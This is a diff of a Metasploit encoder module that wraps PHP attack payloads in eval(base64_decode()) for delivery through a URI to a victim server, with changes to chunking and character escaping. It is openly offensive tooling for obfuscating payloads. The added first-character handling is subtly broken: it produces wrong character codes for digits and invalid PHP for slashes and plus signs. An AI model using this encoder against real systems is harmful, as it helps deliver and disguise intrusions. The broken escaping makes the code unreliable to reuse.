@@ -21,10 +21,10 @@ class Metasploit3 < Msf::Encoder
 			'Version'          => '$Revision$',
 			'Description'      => %q{
 				This encoder returns a base64 string encapsulated in
-				eval(base64_decode()), increasing the size by roughly one
-				third.
+				eval(base64_decode()), increasing the size by a bit more than
+				one third.
 			},
-			'Author'           => 'egypt <egypt@nmt.edu>',
+			'Author'           => 'egypt',
 			'License'          => BSD_LICENSE,
 			'Arch'             => ARCH_PHP)
 	end
@@ -40,8 +40,9 @@ class Metasploit3 < Msf::Encoder
 		# identifiers, i.e., things that start with [a-zA-Z] and contain only
 		# [a-zA-Z0-9_].  Also, for payloads that encode to more than 998
 		# characters, only part of the payload gets unencoded on the victim,
-		# presumably due to a limitation in php identifier names, so we break
-		# the encoded payload into roughly 900-byte chunks. 
+		# presumably due to a limitation in PHP identifier name lengths, so we
+		# break the encoded payload into roughly 900-byte chunks.
+
 		b64 = Rex::Text.encode_base64(buf)
 
 		# The '=' or '==' used for padding at the end of the base64 encoded
@@ -49,17 +50,33 @@ class Metasploit3 < Msf::Encoder
 		# raw string, so strip it off.
 		b64.gsub!(/[=\n]+/, '')
 
-		b64.gsub!(/[+]/, '.chr(0x2b).')
+		# The first character must not be a non-alpha character or PHP chokes.
+		i = 0
+		while (b64[i].chr =~ %r{[0-9/+]})
+			b64[i] = "chr(#{b64[i]})."
+		end
+
+		# Similarly, when we seperate large payloads into chunks to avoid the
+		# 998-byte problem mentioned above, we have to make sure that the first
+		# character of each chunk is an alpha character.  This simple algorithm
+		# will create a broken string in the case of 99 consecutive digits,
+		# slashes, and plusses in the base64 encoding, but the likelihood of
+		# that is low enough that I don't care.
 		i = 900;
 		while i < b64.length
-			while (b64[i].chr =~ /^[0-9]/)
-				# We must be careful not to begin a chunk with a digit because
-				# then PHP thinks it's a number and chokes.
+			while (b64[i].chr =~ %r{[0-9/+]})
 				i += 1
 			end
 			b64.insert(i,'.')
 			i += 900
 		end
+
+		# Plus characters ('+') in a uri are converted to spaces, so replace
+		# them with something that PHP will turn into a plus.  Slashes cause
+		# parse errors on the server side, so do the same for them.
+		b64.gsub!("+", ".chr(43).")
+		b64.gsub!("/", ".chr(47).")
+
 		
 		return "eval(base64_decode(" + b64 + "));"
 	end
